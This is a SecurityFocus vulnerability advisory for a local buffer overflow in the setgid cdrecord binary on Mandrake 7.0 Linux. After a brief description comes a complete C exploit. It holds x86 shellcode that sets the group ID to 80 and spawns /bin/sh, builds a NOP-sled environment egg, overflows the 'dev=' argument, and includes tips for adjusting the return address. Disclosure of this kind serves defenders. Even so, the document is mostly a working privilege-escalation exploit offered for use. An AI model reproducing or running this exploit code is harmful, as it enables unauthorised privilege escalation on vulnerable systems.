source: http://www.securityfocus.com/bid/1265/info

The linux cdrecorder binary is vulnerable to a locally exploitable buffer overflow attack. When installed in a Mandrake 7.0 linux distribution, it is by default setgid "cdburner" (which is a group, gid: 80, that is created for the application). The overflow condition is the result of no bounds checking on the 'dev=' argument passed to cdburner at execution time. This vulnerability can be exploited to execute arbitrary commands with egid "cdburner". cdburner has been verified (by the writers of the exploit) to be exploitable on an Intel linux system running Mandrake 7.0. Other distributions of linux may be vulnerable to this problem as well. 

/*  /usr/bin/cdrecord exploit by noir 
 *  x86/Linux 
 *  noir@gsu.linux.org.tr | noir@olympos.org
 *  dev= param overflow 
 *  this script will get you gid = 80 group cdwriter  
 *  tested on Mandrake 7.0 (Air) 
 *  greetz: dustdevil, Cronos, moog, still, BlaCK #olympos irc.sourtimes.org 
 *  
 *  
 */

#include <stdio.h>
#include <string.h>

#define NOP             0x90
#define RET     0xbffffe66 //play with argv[1] +10, -10 if default is not ok  
int 
main(int argc, char *argv[])

{
        unsigned char shell[] =
        "\x31\xc0\xb0\x50\x89\xc3\x89\xc1\xb0\x47\xcd\x80"  /*setregid(80, 80) */
    "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b"
        "\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd"
        "\x80\xe8\xdc\xff\xff\xff/bin/sh";

        char egg[400];
    char buf[80];
        int i, a;
        long ret = RET;

     if(argv[1])
        ret = ret - atoi(argv[1]);               
  
        memset(egg, NOP, 400);
    
        for(i = 0  ; i < 80 ; i+=4)
                *(long *) &buf[i] = ret;
    
        for( i = 300, a = 0; a < strlen(shell) ; i++, a++ )
    egg[i] = shell[a];
        
        buf[72] = 0x00;
        egg[399] = 0x00;
        printf("eip: 0x%x\n", ret);

        setenv("EGG", egg, 1);
        execl("/usr/bin/cdrecord", "cdrecord","dev=", buf, "/etc/passwd", 0);

}
